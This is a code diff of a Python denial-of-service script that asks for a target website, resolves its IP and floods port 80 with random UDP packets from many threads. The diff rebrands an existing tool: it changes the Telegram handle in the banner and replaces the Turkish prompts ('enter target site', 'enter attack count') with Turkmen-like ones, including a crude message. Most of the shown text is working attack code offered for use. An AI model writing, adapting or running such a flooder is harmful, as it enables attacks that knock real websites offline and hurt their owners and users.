@@ -34,7 +34,7 @@ print('''
          OO!                   ON!
          
           
-           TELEGRAM :@ChamberSaldi
+           TELEGRAM :@oldtm
 ''')
 def create_rnd_msg(msg_size):
 	rnd_msg = ""
@@ -42,12 +42,12 @@ def create_rnd_msg(msg_size):
 		ch_rnd = random.randint(0, 255)
 		rnd_msg += chr(ch_rnd)
 	return rnd_msg
-site = input("[+] - HEDEF SİTE GİR => ")
+site = input("[+] - ATAKA Etmeli saýdy ýaz => ")
 if 'https://'in site:
 	site=site.split('https://')[1]
 if '/'in site :
 	site=site.split('/')[0]
-thread_count = int(input("[+] - SALDIRI SAYISI GİR => "))
+thread_count = int(input("[+] - Ataka Sany ýaz => "))
 ip = socket.gethostbyname(site)
 UDP_PORT=80
 print('\n'*2)
@@ -62,7 +62,7 @@ def dos():
 		MESSAGE = str.encode(create_rnd_msg(8))
 		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 		sock.sendto(MESSAGE, (ip, UDP_PORT))
-		print(f'\rBaşarıyla Gönderildi Telegram @TekCrackArsiv =>  {i}',end='')	
+		print(f'\rSeks öwm³¹ ataka edildi :)  {i}',end='')	
 thread_count=thread_count+1
 for i in range(thread_count):
 	try:
